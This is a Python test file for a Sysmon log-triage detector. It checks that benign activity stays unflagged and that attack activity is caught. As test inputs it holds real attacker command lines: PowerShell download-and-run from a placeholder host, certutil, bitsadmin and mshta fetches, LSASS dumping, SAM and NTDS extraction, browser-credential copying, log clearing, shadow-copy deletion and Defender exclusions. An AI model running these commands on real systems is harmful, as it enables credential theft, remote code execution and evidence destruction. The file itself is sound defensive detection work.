"""The checks and the verdict: benign activity stays Benign, attack activity is caught."""

import base64

from tests.fixtures.events import attack_events, benign_events, event
from triage.checks import edit_distance, make_verdict, run_checks
from triage import parse
from triage.parse import event_from_xml


def checks_fired(events):
    return {f["check"] for f in run_checks(events)}


# ---------- false positives: normal activity must not be flagged ----------

def test_benign_activity_has_no_findings():
    findings = run_checks(benign_events())
    assert findings == []
    assert make_verdict(findings)["label"] == "Benign"


def test_person_typing_whoami_and_ipconfig_is_not_a_recon_burst():
    # benign_events() has whoami + ipconfig in a cmd window opened from explorer.exe
    assert "recon_burst" not in checks_fired(benign_events())


def test_edge_run_key_and_onedrive_are_known_good():
    assert "persistence" not in checks_fired(benign_events())
    assert "run_from_user_folder" not in checks_fired(benign_events())


# ---------- the attack is caught ----------

def test_attack_is_malicious_with_the_expected_findings():
    findings = run_checks(attack_events())
    fired = {f["check"] for f in findings}
    assert {"persistence", "recon_burst", "lookalike_domain", "suspicious_powershell",
            "document_app_spawns_program", "masquerading", "ransom_note",
            "run_from_user_folder", "network_from_user_folder"} <= fired
    assert make_verdict(findings)["label"] == "Malicious"


def test_every_finding_points_to_real_events():
    events = attack_events()
    ids = {e["record_id"] for e in events}
    for f in run_checks(events):
        assert f["event_ids"], f
        assert set(f["event_ids"]) <= ids


def test_service_from_dropped_file_is_strong_but_program_files_service_is_not():
    events = attack_events() + [
        event(300, 11, "2026-01-05 12:00:00.000", Image="C:\\x\\installer.exe",
              TargetFilename="C:\\Program Files\\Vendor\\agent.exe"),
        event(301, 13, "2026-01-05 12:00:01.000", Image="C:\\Windows\\system32\\services.exe",
              TargetObject="HKLM\\System\\CurrentControlSet\\Services\\VendorAgent\\ImagePath",
              Details='"C:\\Program Files\\Vendor\\agent.exe"'),
    ]
    services = [f for f in run_checks(events) if f["title"] == "New service from a dropped file"]
    assert len(services) == 1
    assert "Fake Updater" in services[0]["detail"]


def test_lookalike_domain_from_browser_is_weak():
    events = [event(1, 22, "2026-01-05 09:00:00.000", Image="C:\\Program Files\\Google\\Chrome\\chrome.exe",
                    QueryName="gmailc.om")]
    findings = run_checks(events)
    assert findings[0]["strength"] == "Weak"
    assert make_verdict(findings)["label"] == "Suspicious"


def test_lookalike_becomes_strong_when_malware_looks_it_up_after_a_browser():
    # The browser lookup comes first (Weak), then a program in a user folder looks up the same name.
    events = [event(1, 22, "2026-01-05 09:00:00.000", Image="C:\\Program Files\\Google\\Chrome\\chrome.exe",
                    QueryName="gmailc.om"),
              event(2, 22, "2026-01-05 09:05:00.000", Image="C:\\Users\\analyst\\AppData\\Local\\Temp\\x.exe",
                    QueryName="gmailc.om")]
    lookalike = [f for f in run_checks(events) if f["check"] == "lookalike_domain"]
    assert len(lookalike) == 1
    assert lookalike[0]["strength"] == "Strong"
    assert lookalike[0]["process"].endswith("x.exe") and "browser" not in lookalike[0]["detail"]
    assert lookalike[0]["time"] == "2026-01-05 09:00:00.000"  # still starts at the first lookup
    assert lookalike[0]["event_ids"] == [1, 2]


def test_passwords_are_hidden():
    hide = parse.hide_secrets
    assert hide(r"net use \\pc02\c$ Secret1 /user:lab\admin") == r"net use \\pc02\c$ **** /user:lab\admin"
    assert hide(r"net use z: \\pc02\share Secret1") == r"net use z: \\pc02\share ****"
    assert hide(r"net use \\pc02\c$ /user:lab\admin") == r"net use \\pc02\c$ /user:lab\admin"  # no password
    assert hide("psexec \\\\pc02 -u admin -p Secret1 cmd") == "psexec \\\\pc02 -u admin -p **** cmd"
    assert hide("tool.exe /p:Secret1 /x") == "tool.exe /p:**** /x"
    assert hide("tool.exe --password=Secret1") == "tool.exe --password=****"
    assert hide("New-Thing -Password 'Secret 1' -Force") == "New-Thing -Password **** -Force"
    assert hide('schtasks /create /tn T /ru admin /rp "Secret 1"') == "schtasks /create /tn T /ru admin /rp ****"
    assert hide("Server=db01;Database=x;Pwd=Secret1;") == "Server=db01;Database=x;Pwd=****;"
    # Normal command lines are left alone.
    for text in ["powershell.exe -enc SQBFAFgA", "C:\\Program Files\\App\\app.exe /S", "whoami /priv",
                 "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",  # -p without a value
                 "C:\\Users\\analyst\\AppData\\Local\\Temp\\FireEye.exe -foobar"]:
        assert hide(text) == text


def test_passwords_are_hidden_when_events_are_read():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
           '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
           '<TimeCreated SystemTime="2026-01-05 09:00:00.123456+00:00"/><EventRecordID>7</EventRecordID>'
           '<Computer>LAB-PC01</Computer></System><EventData>'
           '<Data Name="CommandLine">net use \\\\pc02\\c$ Secret1 /user:admin</Data>'
           '<Data Name="ParentCommandLine">cmd.exe /c psexec -p Secret1</Data></EventData></Event>')
    parsed = event_from_xml(xml)
    assert "Secret1" not in str(parsed)
    assert parsed["CommandLine"] == "net use \\\\pc02\\c$ **** /user:admin"


def test_one_damaged_record_does_not_stop_the_file(monkeypatch):
    good_xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
                '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
                '<TimeCreated SystemTime="2026-01-05 09:00:0{n}.000000+00:00"/><EventRecordID>{n}</EventRecordID>'
                '<Computer>LAB-PC01</Computer></System><EventData>'
                '<Data Name="UtcTime">2026-01-05 09:00:0{n}.000</Data><Data Name="Image">C:\\a.exe</Data>'
                '</EventData></Event>')

    class FakeParser:  # stands in for evtx.PyEvtxParser: records() gives dicts with the XML in "data"
        def __init__(self, path):
            pass

        def records(self):
            damaged = "<Event><System>half a record"  # XML that cannot be read
            return [{"data": good_xml.format(n=1)}, {"data": damaged}, {"data": good_xml.format(n=3)}]

    monkeypatch.setattr(parse, "PyEvtxParser", FakeParser)
    assert [e["record_id"] for e in parse.read_evtx("any.evtx")] == [1, 3]


def test_lsass_access_from_unknown_program_is_strong():
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage="C:\\Users\\a\\Downloads\\tool.exe",
                    TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1010"),
              event(2, 10, "2026-01-05 09:00:01.000", SourceImage="C:\\Windows\\system32\\svchost.exe",
                    TargetImage="C:\\Windows\\system32\\lsass.exe", GrantedAccess="0x1000")]
    findings = run_checks(events)
    assert [f["check"] for f in findings] == ["lsass_access"]
    assert findings[0]["event_ids"] == [1]


def test_office_spawning_powershell():
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{x}", ParentProcessGuid="{w}",
                    Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    ParentImage="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    CommandLine="powershell -nop")]
    assert "document_app_spawns_program" in checks_fired(events)


# ---------- fewer false "Malicious" verdicts ----------

LSASS = "C:\\Windows\\system32\\lsass.exe"


def test_lsass_access_without_memory_read_is_not_reported():
    # 0x1000 = basic information only (Task Manager does this); no right to read memory.
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage="C:\\Windows\\System32\\Taskmgr.exe",
                    TargetImage=LSASS, GrantedAccess="0x1000")]
    assert run_checks(events) == []


def test_lsass_trusted_name_in_a_user_folder_is_strong():
    fake = "C:\\Users\\bob\\AppData\\Roaming\\MsMpEng.exe"
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage=fake, TargetImage=LSASS,
                    GrantedAccess="0x1fffff")]
    findings = run_checks(events)
    assert [f["strength"] for f in findings] == ["Strong"]


def test_lsass_real_defender_and_unknown_access():
    defender = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"
    old_defender = "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
    events = [event(1, 10, "2026-01-05 09:00:00.000", SourceImage=defender, TargetImage=LSASS,
                    GrantedAccess="0x1fffff"),
              event(2, 10, "2026-01-05 09:00:01.000", SourceImage=old_defender, TargetImage=LSASS,
                    GrantedAccess="0x1fffff"),
              # A missing access value still counts: unknown access to LSASS is worth a look.
              event(3, 10, "2026-01-05 09:00:02.000", SourceImage="C:\\Users\\a\\tool.exe", TargetImage=LSASS)]
    findings = run_checks(events)
    assert [f["event_ids"] for f in findings] == [[3]]


def test_lookalike_compares_only_the_main_name():
    agent = "C:\\Program Files\\Agent\\agent.exe"
    normal = [event(n, 22, "2026-01-05 09:00:00.000", Image=agent, QueryName=name)
              for n, name in enumerate(["cloud.google.com", "apply.workday.com", "offices.example.com"], start=1)]
    assert run_checks(normal) == []
    fake = [event(9, 22, "2026-01-05 09:00:00.000", Image=agent, QueryName="fireeyee.com")]
    assert [f["strength"] for f in run_checks(fake)] == ["Strong"]


def test_discord_run_key_is_known_good():
    discord = "C:\\Users\\analyst\\AppData\\Local\\Discord\\app-1.0.9\\Discord.exe"
    events = [event(1, 13, "2026-01-05 09:00:00.000", Image=discord,
                    TargetObject="HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Discord",
                    Details='"C:\\Users\\analyst\\AppData\\Local\\Discord\\Update.exe" --processStart Discord.exe')]
    assert "persistence" not in checks_fired(events)


PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def encoded(script):
    """A PowerShell -EncodedCommand line for this script (base64 of UTF-16 text), as PowerShell writes it."""
    return "powershell -NoProfile -EncodedCommand " + base64.b64encode(script.encode("utf-16-le")).decode()


def powershell_strengths(command):
    """The strengths of the findings for one PowerShell command line."""
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{ps}", Image=PS, CommandLine=command)]
    return [f["strength"] for f in run_checks(events)]


def test_hidden_or_encoded_powershell_alone_is_not_suspicious():
    assert powershell_strengths("powershell.exe -NoProfile -WindowStyle Hidden -File "
                                "C:\\Program Files\\Agent\\inventory.ps1") == []
    # A monitoring agent's encoded command that only reads a counter.
    assert powershell_strengths(encoded("Get-Counter '\\Processor(_Total)\\% Processor Time'")) == []


def test_powershell_download_and_run_is_strong():
    download_and_run = "iex (New-Object Net.WebClient).DownloadString('http://x.example/a')"
    assert powershell_strengths("powershell -c " + download_and_run) == ["Strong"]
    assert powershell_strengths(encoded(download_and_run)) == ["Strong"]       # same, hidden by encoding
    assert powershell_strengths(encoded("iex ([Text.Encoding]::UTF8.GetString("
                                        "[Convert]::FromBase64String($b)))")) == ["Strong"]


def test_powershell_download_only_is_weak():
    assert powershell_strengths(encoded("iwr http://x.example/readme.txt -OutFile $env:TEMP\\r.txt")) == ["Weak"]
    assert powershell_strengths("powershell -c iex $code") == ["Weak"]
    finding = run_checks([event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{ps}", Image=PS,
                                CommandLine=encoded("iwr http://x.example/a"))])[0]
    assert finding["detail"] == "decoded command: iwr http://x.example/a"  # the analyst sees what it does


def test_recon_typed_in_a_remote_admin_session_is_not_a_burst():
    def recon(launcher):
        return [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{l}", Image=launcher),
                event(2, 1, "2026-01-05 09:00:01.000", ProcessGuid="{w}", ParentProcessGuid="{l}",
                      Image="C:\\Windows\\System32\\whoami.exe", ParentImage=launcher),
                event(3, 1, "2026-01-05 09:00:02.000", ProcessGuid="{n}", ParentProcessGuid="{l}",
                      Image="C:\\Windows\\System32\\net.exe", ParentImage=launcher)]
    assert "recon_burst" not in checks_fired(recon("C:\\Windows\\System32\\wsmprovhost.exe"))
    assert [f["strength"] for f in run_checks(recon("C:\\Windows\\System32\\rundll32.exe"))
            if f["check"] == "recon_burst"] == ["Strong"]


def test_run_key_strength_depends_on_what_it_starts():
    run_key = "HKU\\S-1-5-21-0\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Tool"
    installer = "C:\\Users\\analyst\\Downloads\\setup.exe"

    def run_key_findings(value):
        events = [event(1, 13, "2026-01-05 09:00:00.000", Image=installer, TargetObject=run_key, Details=value)]
        return [(f["strength"], f["title"]) for f in run_checks(events) if f["check"] == "persistence"]

    assert run_key_findings('"C:\\Users\\analyst\\AppData\\Roaming\\Tool\\tray.exe" /tray') == \
        [("Weak", "Starts itself at logon (Run key)")]
    assert run_key_findings("rundll32.exe C:\\Users\\analyst\\AppData\\Roaming\\Tool\\x.dll,Start") == \
        [("Strong", "Starts a DLL at logon (Run key)")]


def command_findings(image, command):
    """(check, strength) of every finding for one program run with this command line."""
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{c}", Image=image, CommandLine=command,
                    ParentImage="C:\\Windows\\System32\\cmd.exe")]
    return [(f["check"], f["strength"]) for f in run_checks(events)]


SYS = "C:\\Windows\\System32\\"


def test_remote_execution_is_weak():
    fires = [("C:\\Tools\\PsExec64.exe", '"C:\\Tools\\PsExec64.exe" \\\\SRV-01 -s cmd /c ipconfig'),
             (SYS + "wbem\\WMIC.exe", 'wmic /node:SRV-01 process call create "cmd /c calc"'),
             (SYS + "winrs.exe", "winrs -r:SRV-01 cmd"),
             (SYS + "sc.exe", "sc \\\\SRV-01 create upd binPath= C:\\x.exe"),
             (SYS + "xcopy.exe", "xcopy /Y C:\\Tools\\a.exe \\\\SRV-01\\C$\\Windows\\Temp\\"),
             (SYS + "net.exe", "net use \\\\SRV-01\\ADMIN$ /user:corp\\admin"),
             (SYS + "WindowsPowerShell\\v1.0\\powershell.exe", "powershell Invoke-Command -ComputerName SRV-01 {hostname}")]
    for image, command in fires:
        assert ("remote_execution", "Weak") in command_findings(image, command), command
    quiet = [(SYS + "wbem\\WMIC.exe", "wmic process list brief"),          # WMI on this computer
             (SYS + "net.exe", "net use Z: \\\\FILES-01\\Shared"),          # a normal file share
             (SYS + "robocopy.exe", "robocopy E:\\Export \\\\BACKUP-01\\Backups$ /MIR")]  # not an admin share
    for image, command in quiet:
        assert "remote_execution" not in [c for c, _ in command_findings(image, command)], command


def test_access_changes_are_weak():
    fires = [(SYS + "net.exe", "net user helpdesk **** /add"),
             (SYS + "net1.exe", 'net1 localgroup "Administrators" helpdesk /add'),
             (SYS + "net.exe", 'net group "Domain Admins" helpdesk /add /domain'),
             (SYS + "netsh.exe", 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes')]
    for image, command in fires:
        assert ("access_change", "Weak") in command_findings(image, command), command
    quiet = [(SYS + "net.exe", "net user helpdesk"),                       # only looks at an account
             (SYS + "net.exe", 'net localgroup "Administrators"'),          # only lists the group
             (SYS + "netsh.exe", "netsh advfirewall show allprofiles")]     # only reads the firewall
    for image, command in quiet:
        assert command_findings(image, command) == [], command


def test_scheduled_task_and_windows_tool_downloads_are_weak():
    assert ("scheduled_task", "Weak") in command_findings(
        SYS + "schtasks.exe", 'schtasks /create /tn "Update" /tr C:\\x.exe /sc daily')
    assert command_findings(SYS + "schtasks.exe", "schtasks /query /fo list") == []
    downloads = [(SYS + "certutil.exe", "certutil -urlcache -split -f http://x.example/a.dat a.dat"),
                 (SYS + "certutil.exe", "certutil -decode in.txt out.exe"),
                 (SYS + "bitsadmin.exe", "bitsadmin /transfer job http://x.example/a.exe C:\\a.exe"),
                 (SYS + "mshta.exe", "mshta http://x.example/page.hta"),
                 (SYS + "regsvr32.exe", "regsvr32 /s /u /i:http://x.example/a.sct scrobj.dll")]
    for image, command in downloads:
        assert ("tool_download", "Weak") in command_findings(image, command), command
    # curl is a real download tool; certutil reading a certificate is normal.
    assert command_findings("C:\\Windows\\System32\\curl.exe", "curl -L -o gh.zip https://example.com/gh.zip") == []
    assert command_findings(SYS + "certutil.exe", "certutil -dump cert.cer") == []


def test_dll_from_a_user_folder_is_weak():
    dll = "C:\\Users\\analyst\\AppData\\Roaming\\Tool\\update.dll"
    assert ("dll_from_user_folder", "Weak") in command_findings(SYS + "rundll32.exe", f"rundll32.exe {dll},Start")
    assert command_findings(SYS + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\shell32.dll,"
                                                  "Control_RunDLL desk.cpl") == []


def test_credential_theft_is_strong():
    chrome_store = "C:\\Users\\analyst\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    fires = [(SYS + "esentutl.exe", f'esentutl.exe /y "{chrome_store}" /d C:\\Users\\Public\\ld.tmp'),
             (SYS + "rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\d.dmp full"),
             ("C:\\Tools\\procdump64.exe", "procdump64.exe -accepteula -ma lsass.exe out.dmp"),
             (SYS + "reg.exe", "reg save HKLM\\SAM C:\\Users\\Public\\sam.hiv"),
             (SYS + "ntdsutil.exe", 'ntdsutil "ac i ntds" "ifm" "create full C:\\x" q q')]
    for image, command in fires:
        assert ("credential_theft", "Strong") in command_findings(image, command), command
    # Chrome opening its own profile, and reading a normal registry key, are not theft.
    chrome = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    assert command_findings(chrome, f'chrome.exe --user-data-dir="{chrome_store}"') == []
    assert command_findings(SYS + "reg.exe", "reg query HKLM\\SOFTWARE\\Microsoft") == []


def test_evidence_removal_is_strong():
    fires = [(SYS + "wevtutil.exe", "wevtutil cl System"),
             (SYS + "fltMC.exe", "fltMC unload SysmonDrv"),
             (SYS + "sc.exe", "sc stop Sysmon64"),
             (SYS + "vssadmin.exe", "vssadmin delete shadows /all /quiet"),
             (SYS + "wbem\\WMIC.exe", "wmic shadowcopy delete"),
             (SYS + "bcdedit.exe", "bcdedit /set {default} recoveryenabled No")]
    for image, command in fires:
        assert ("evidence_removal", "Strong") in command_findings(image, command), command
    # Reading a log, and creating a shadow copy (a backup), are normal.
    assert command_findings(SYS + "wevtutil.exe", "wevtutil qe System /c:5") == []
    assert command_findings(SYS + "vssadmin.exe", "vssadmin create shadow /for=E:") == []


def test_defender_weakened_is_weak():
    ps = SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
    assert ("defender_weakened", "Weak") in command_findings(ps, "powershell Set-MpPreference -DisableRealtimeMonitoring $true")
    assert ("defender_weakened", "Weak") in command_findings(ps, "powershell Add-MpPreference -ExclusionPath C:\\x")
    key = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\analyst\\AppData\\x"
    loader = "C:\\Users\\analyst\\AppData\\Roaming\\x\\loader.exe"
    events = [event(1, 13, "2026-01-05 09:00:00.000", Image=loader, TargetObject=key, Details="DWORD (0x00000000)")]
    assert [(f["check"], f["strength"]) for f in run_checks(events)] == [("defender_weakened", "Weak")]
    # Defender's own update, and switching protection back ON (Disable... = 0), are not weakening.
    defender = "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe"
    on = "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"
    quiet = [event(2, 13, "2026-01-05 09:00:00.000", Image=defender, TargetObject=key, Details="DWORD (0x00000000)"),
             event(3, 13, "2026-01-05 09:00:00.000", Image=SYS + "svchost.exe", TargetObject=on,
                   Details="DWORD (0x00000000)")]
    assert run_checks(quiet) == []


def test_uac_bypass_is_strong():
    key = "HKU\\S-1-5-21-0_Classes\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)"
    events = [event(1, 13, "2026-01-05 09:00:00.000", Image=SYS + "WindowsPowerShell\\v1.0\\powershell.exe",
                    TargetObject=key, Details="powershell -w hidden -c calc")]
    assert [(f["check"], f["strength"]) for f in run_checks(events)] == [("uac_bypass", "Strong")]
    normal = "HKU\\S-1-5-21-0_Classes\\Software\\Classes\\.pdf\\OpenWithProgids\\AcroExch.Document"
    assert run_checks([event(2, 13, "2026-01-05 09:00:00.000", Image="C:\\x.exe", TargetObject=normal)]) == []


def test_command_line_findings_carry_the_rule_tag():
    events = [event(1, 1, "2026-01-05 09:00:00.000", ProcessGuid="{w}", Image=SYS + "wbem\\WMIC.exe",
                    CommandLine='wmic /node:SRV-01 process call create "cmd"')]
    finding = run_checks(events)[0]
    assert (finding["tactic"], finding["technique"]) == ("Execution", "T1047 Windows Management Instrumentation")


def test_only_low_findings_never_make_malicious():
    weak = [{"strength": "Weak", "title": f"signal {n}"} for n in range(6)]
    assert make_verdict(weak)["label"] == "Suspicious"


def test_ransom_words_in_a_program_file_are_not_a_note():
    python = "C:\\Python314\\python.exe"
    events = [event(1, 11, "2026-01-05 09:00:00.000", Image=python,
                    TargetFilename="C:\\Python314\\Lib\\site-packages\\Crypto\\decrypt_test.py")]
    assert "ransom_note" not in checks_fired(events)


# ---------- verdict and helpers ----------

def test_enrichment_can_raise_suspicious_to_malicious():
    weak_only = [{"strength": "Weak", "title": "x"}]
    assert make_verdict(weak_only)["label"] == "Suspicious"
    assert make_verdict(weak_only, ["malicious"])["label"] == "Malicious"


def test_edit_distance():
    assert edit_distance("fireeyee", "fireeye") == 1
    assert edit_distance("gmailc", "gmail") == 1
    assert edit_distance("google", "google") == 0


def test_event_from_xml_reads_fields_and_skips_other_providers():
    xml = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System>'
           '<Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>'
           '<TimeCreated SystemTime="2026-01-05 09:00:00.123456+00:00"/><EventRecordID>42</EventRecordID>'
           '<Computer>LAB-PC01</Computer></System><EventData>'
           '<Data Name="UtcTime">2026-01-05 09:00:00.120</Data><Data Name="Image">C:\\a.exe</Data>'
           '<Data Name="CommandLine"></Data></EventData></Event>')
    parsed = event_from_xml(xml)
    assert parsed == {"record_id": 42, "event_id": 1, "computer": "LAB-PC01",
                      "time": "2026-01-05 09:00:00.120", "UtcTime": "2026-01-05 09:00:00.120",
                      "Image": "C:\\a.exe", "CommandLine": ""}
    assert event_from_xml(xml.replace("Microsoft-Windows-Sysmon", "Microsoft-Windows-Security-Auditing")) is None
